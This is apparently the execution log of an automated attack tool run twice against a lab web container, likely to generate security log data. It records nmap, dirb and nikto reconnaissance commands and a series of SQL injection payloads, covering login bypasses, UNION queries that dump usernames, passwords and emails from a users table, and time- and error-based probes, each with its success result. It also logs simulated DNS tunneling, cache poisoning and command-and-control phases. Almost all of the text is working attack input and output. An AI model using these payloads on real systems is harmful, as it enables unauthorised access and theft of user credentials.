2025-07-24 00:12:08,373 - INFO - DNS attack phase completed successfully
2025-07-24 00:12:08,374 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 00:13:22,006 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 01:07:01,088 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-24 01:07:01,088 - INFO - Container ID: attacker
2025-07-24 01:07:01,088 - INFO - Target: http://victim-web:80
2025-07-24 01:07:01,088 - INFO - Attack Type: sql_injection
2025-07-24 01:07:01,088 - INFO - Variant ID: None
2025-07-24 01:07:01,088 - INFO - Benign Only: False
2025-07-24 01:07:01,088 - INFO - ============================================================
2025-07-24 01:07:01,089 - INFO - === Testing Container Connectivity ===
2025-07-24 01:07:01,092 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-24 01:07:01,092 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-24 01:07:01,092 - INFO - === Network Reconnaissance Phase ===
2025-07-24 01:07:01,093 - INFO - Running: nmap -sS -p- victim-web
2025-07-24 01:07:01,803 - INFO - [+] Nmap scan completed with return code: 0
2025-07-24 01:07:06,813 - INFO - === Web Application Enumeration Phase ===
2025-07-24 01:07:06,816 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-24 01:07:07,855 - INFO - [+] Dirb scan completed with return code: 0
2025-07-24 01:07:07,855 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-24 01:07:15,458 - INFO - [+] Nikto scan completed with return code: 0
2025-07-24 01:07:20,464 - INFO - === Custom SQL Injection Phase ===
2025-07-24 01:07:20,464 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-24 01:07:20,481 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 01:07:23,226 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-24 01:07:23,242 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 01:07:25,435 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-24 01:07:25,446 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 01:07:27,856 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-24 01:07:27,871 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-24 01:07:29,345 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-24 01:07:29,363 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 01:07:31,488 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-24 01:07:31,498 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-24 01:07:32,643 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-24 01:07:32,645 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 01:07:35,262 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-24 01:07:35,271 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 01:07:38,253 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-24 01:07:38,258 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 01:07:40,513 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-24 01:07:40,522 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 01:07:42,053 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-24 01:07:42,068 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 01:07:48,880 - INFO - === Data Extraction Phase ===
2025-07-24 01:07:48,897 - INFO -     Found 1 columns in search query
2025-07-24 01:07:48,898 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-24 01:07:48,914 - INFO -     Status: 200, Success: True
2025-07-24 01:07:48,939 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-24 01:07:48,944 - INFO -     Found user: admin
2025-07-24 01:07:49,946 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-24 01:07:49,952 - INFO -     Found user: alice
2025-07-24 01:07:50,955 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-24 01:07:50,966 - INFO -     Found user: bob
2025-07-24 01:07:51,969 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-24 01:07:51,980 - INFO -     Found user: guest
2025-07-24 01:07:52,984 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-24 01:07:52,995 - INFO -     Found user: john
2025-07-24 01:07:53,996 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-24 01:07:54,012 - INFO -     Found user: manager
2025-07-24 01:07:55,014 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-24 01:07:55,028 - INFO -     Found user: test
2025-07-24 01:07:56,030 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-24 01:07:56,040 - INFO -     Found user: user1
2025-07-24 01:07:57,046 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-24 01:07:57,062 - INFO -     Found user: user1
2025-07-24 01:07:58,065 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-24 01:07:58,074 - INFO -     Found user: test
2025-07-24 01:07:59,077 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-24 01:07:59,079 - INFO - === DNS Attack Phase ===
2025-07-24 01:07:59,080 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 01:08:30,660 - INFO - Generated 22 DNS attack log entries
2025-07-24 01:08:30,664 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 01:08:30,664 - INFO - Generating HTTP proxy logs...
2025-07-24 01:08:30,672 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 01:08:30,673 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 01:08:30,674 - INFO - Executing DNS reconnaissance...
2025-07-24 01:08:35,373 - INFO - Executing DNS brute force...
2025-07-24 01:08:37,744 - INFO - Executing DNS tunneling...
2025-07-24 01:08:42,113 - INFO - Executing C&C communication...
2025-07-24 01:08:46,583 - INFO - DNS attack phase completed successfully
2025-07-24 01:08:46,584 - INFO - === Saving Attack Results ===
2025-07-24 01:08:46,585 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-24 01:08:46,589 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-24 01:08:46,590 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-24 01:08:46,591 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 01:08:46,591 - INFO - 
[ATTACK_END] 2025-07-24T01:08:46.584578
2025-07-24 01:08:46,591 - INFO - 
✅ Enhanced container attack completed!
2025-07-24 01:08:46,591 - INFO - Check the following for attack data:
2025-07-24 01:08:46,591 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-24 01:08:46,591 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-24 01:08:46,591 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-24 01:08:46,591 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-24 01:08:46,592 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-24 01:08:46,592 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-24 01:29:09,148 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 01:29:44,451 - INFO - Generated 22 DNS attack log entries
2025-07-24 01:29:44,453 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 01:37:08,022 - INFO - === DNS Attack Phase ===
2025-07-24 01:37:08,022 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 01:38:00,476 - INFO - Generated 35 DNS attack log entries
2025-07-24 01:38:00,477 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 01:38:00,477 - INFO - Generating HTTP proxy logs...
2025-07-24 01:38:00,482 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 01:38:00,482 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'tunneling'], 'intensity': 'medium', 'delay_between_queries': '1-3', 'subdomain_wordlist_size': 60}
2025-07-24 01:38:00,483 - INFO - Executing DNS reconnaissance...
2025-07-24 01:38:03,572 - INFO - Executing DNS brute force...
2025-07-24 01:38:06,831 - INFO - Executing DNS tunneling...
2025-07-24 01:38:09,780 - INFO - DNS attack phase completed successfully
2025-07-24 01:38:17,553 - INFO - === DNS Attack Phase ===
2025-07-24 01:38:17,553 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 01:39:46,585 - INFO - Generated 55 DNS attack log entries
2025-07-24 01:39:46,588 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 01:39:46,588 - INFO - Generating HTTP proxy logs...
2025-07-24 01:39:46,597 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 01:39:46,597 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'amplification', 'tunneling', 'cc_communication'], 'intensity': 'high', 'delay_between_queries': '0.5-1', 'subdomain_wordlist_size': 80}
2025-07-24 01:39:46,599 - INFO - Executing DNS reconnaissance...
2025-07-24 01:39:48,831 - INFO - Executing DNS brute force...
2025-07-24 01:39:51,034 - INFO - Executing DNS tunneling...
2025-07-24 01:39:51,887 - INFO - Executing C&C communication...
2025-07-24 01:39:52,760 - INFO - DNS attack phase completed successfully
2025-07-24 02:36:27,121 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-24 02:36:27,121 - INFO - Container ID: attacker
2025-07-24 02:36:27,121 - INFO - Target: http://victim-web:80
2025-07-24 02:36:27,121 - INFO - Attack Type: sql_injection
2025-07-24 02:36:27,121 - INFO - Variant ID: None
2025-07-24 02:36:27,121 - INFO - Benign Only: False
2025-07-24 02:36:27,121 - INFO - ============================================================
2025-07-24 02:36:27,122 - INFO - === Testing Container Connectivity ===
2025-07-24 02:36:27,125 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-24 02:36:27,125 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-24 02:36:27,125 - INFO - === Network Reconnaissance Phase ===
2025-07-24 02:36:27,125 - INFO - Running: nmap -sS -p- victim-web
2025-07-24 02:36:27,846 - INFO - [+] Nmap scan completed with return code: 0
2025-07-24 02:36:32,852 - INFO - === Web Application Enumeration Phase ===
2025-07-24 02:36:32,853 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-24 02:36:33,843 - INFO - [+] Dirb scan completed with return code: 0
2025-07-24 02:36:33,843 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-24 02:36:41,079 - INFO - [+] Nikto scan completed with return code: 0
2025-07-24 02:36:46,086 - INFO - === Custom SQL Injection Phase ===
2025-07-24 02:36:46,087 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-24 02:36:46,116 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:36:47,929 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-24 02:36:47,948 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:36:50,284 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-24 02:36:50,293 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:36:53,131 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-24 02:36:53,151 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-24 02:36:56,026 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-24 02:36:56,039 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:36:58,076 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-24 02:36:58,085 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-24 02:36:59,900 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-24 02:36:59,910 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:37:01,365 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-24 02:37:01,392 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:37:03,451 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-24 02:37:03,463 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:37:06,280 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-24 02:37:06,296 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:37:08,534 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-24 02:37:08,544 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:37:16,355 - INFO - === Data Extraction Phase ===
2025-07-24 02:37:16,375 - INFO -     Found 1 columns in search query
2025-07-24 02:37:16,376 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-24 02:37:16,379 - INFO -     Status: 200, Success: True
2025-07-24 02:37:16,391 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-24 02:37:16,394 - INFO -     Found user: admin
2025-07-24 02:37:17,396 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-24 02:37:17,403 - INFO -     Found user: alice
2025-07-24 02:37:18,409 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-24 02:37:18,415 - INFO -     Found user: bob
2025-07-24 02:37:19,418 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-24 02:37:19,426 - INFO -     Found user: guest
2025-07-24 02:37:20,430 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-24 02:37:20,438 - INFO -     Found user: john
2025-07-24 02:37:21,443 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-24 02:37:21,457 - INFO -     Found user: manager
2025-07-24 02:37:22,459 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-24 02:37:22,472 - INFO -     Found user: test
2025-07-24 02:37:23,475 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-24 02:37:23,485 - INFO -     Found user: user1
2025-07-24 02:37:24,497 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-24 02:37:24,502 - INFO -     Found user: user1
2025-07-24 02:37:25,503 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-24 02:37:25,516 - INFO -     Found user: test
2025-07-24 02:37:26,521 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-24 02:37:26,522 - INFO - === DNS Attack Phase ===
2025-07-24 02:37:26,522 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 02:38:03,105 - INFO - Generated 22 DNS attack log entries
2025-07-24 02:38:03,109 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 02:38:03,111 - INFO - Generating HTTP proxy logs...
2025-07-24 02:38:03,114 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 02:38:03,114 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'tunneling', 'cc_communication'], 'intensity': 'low', 'delay_between_queries': '2-5', 'subdomain_wordlist_size': 40}
2025-07-24 02:38:03,115 - INFO - Executing DNS reconnaissance...
2025-07-24 02:38:06,541 - INFO - Executing DNS brute force...
2025-07-24 02:38:10,727 - INFO - Executing DNS tunneling...
2025-07-24 02:38:15,293 - INFO - Executing C&C communication...
2025-07-24 02:38:17,367 - INFO - DNS attack phase completed successfully
2025-07-24 02:38:17,369 - INFO - === Saving Attack Results ===
2025-07-24 02:38:17,371 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-24 02:38:17,373 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-24 02:38:17,374 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-24 02:38:17,374 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 02:38:17,374 - INFO - 
[ATTACK_END] 2025-07-24T02:38:17.369344
2025-07-24 02:38:17,375 - INFO - 
✅ Enhanced container attack completed!
2025-07-24 02:38:17,375 - INFO - Check the following for attack data:
2025-07-24 02:38:17,375 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-24 02:38:17,375 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-24 02:38:17,375 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-24 02:38:17,376 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-24 02:38:17,376 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-24 02:38:17,376 - INFO - - Extracted data: /opt/output/extracted_data.html
